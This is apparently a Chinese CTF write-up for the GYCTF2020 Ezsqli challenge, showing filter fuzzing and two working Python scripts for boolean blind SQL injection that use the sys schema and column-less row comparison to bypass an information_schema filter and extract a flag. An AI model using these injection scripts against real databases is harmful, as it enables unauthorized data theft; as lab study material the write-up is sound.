---
title: GYCTF2020-Ezsqli
date: 2025-04-06 16:32:21
tags:
- fuzz测试
- 布尔盲注
- sys数据库
- 无列名注入
- 无列名盲注
category:
- 刷题笔记
---

# GYCTF2020-Ezsqli

打开靶机，发现有个提交表单，应该存在Sql注入，POST传参，id=xxx，抓包然后爆破有无过滤字符。

查看后发现：or、and、union、information_schema......for、floor、rand()、handler、INFORMATION、|、LIEK、from、注释符、分号、括号等都被过滤
这里可能要无列名注入

[无列名sql注入 - qingshanboy - 博客园](https://www.cnblogs.com/q1stop/p/18024992)

```
无列名注入：用数字代替列名 
        1.使用条件：information_schema这个库都被过滤掉了
        2.使用前提：

                ①mysql 5.5.8之后开始使用InnoDb作为默认引擎，mysql 5.6的InnoDb增加了innodb_index_stats和innodb_table_stats两张表，但这两张表记录了数据库和表的信息，但是没有列名       
        例：        
        select group_concat(database_name) from mysql.innodb_index_stats;        
        
        select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()
                ②mysql 5.7开始增加了sys库，用于快速了解系统元数据信息
         例：schema_table_statistics_with_buffer
```

由于information_schema被过滤了，考虑使用其他关键词，如这里的sys.schema_table_statistics_with_buffer

   MySQL 5.7开始新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。

爆表名脚本

```
import requests
import time

url = 'http://d92c6c06-eb7e-4fc6-87ee-e5d5b5ca9159.node5.buuoj.cn:81/index.php'

post_d = {}


def post_text(string):
    return requests.post(url=url, data=string).text


tables_name = ''
for i in range(200):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        payload_tables = '2^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),{0},1))<{1})'.format(i + 1, mid)
        post_d['id'] = payload_tables
        re = post_text(post_d)
        if "Error" in re:
            high = mid
        else:
            low = mid + 1
        mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
    tables_name += chr(mid - 1)
    print(tables_name)

```

得到结果

```
users233333333333333,f1ag_1s_h3r3_hhhhh
```

然后用脚本爆出flag

```
import requests
import time
 
 
def post_text(string):
    return requests.post(url=url, data=string).text
 
 
def get_flag(char, value):
    return value + char
 
 
url = 'http://989aa139-17f2-4be4-b687-b5951dcabc57.node5.buuoj.cn:81/index.php'
post_d = {}
value = ''  # 无列名注入使用
for i in range(1000):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
 
        payload = '2||((select * from f1ag_1s_h3r3_hhhhh)<(select 1,"{}"))'.format(get_flag(chr(mid), value))
        # print(payload)
        post_d['id'] = payload
        re = post_text(post_d)
 
        time.sleep(0.5)
        if "Nu" in re:
            high = mid
        else:
            low = mid + 1
        mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
 
    value += chr(mid - 1)
    print(value)
```

得到flag，然后转换为小写即可
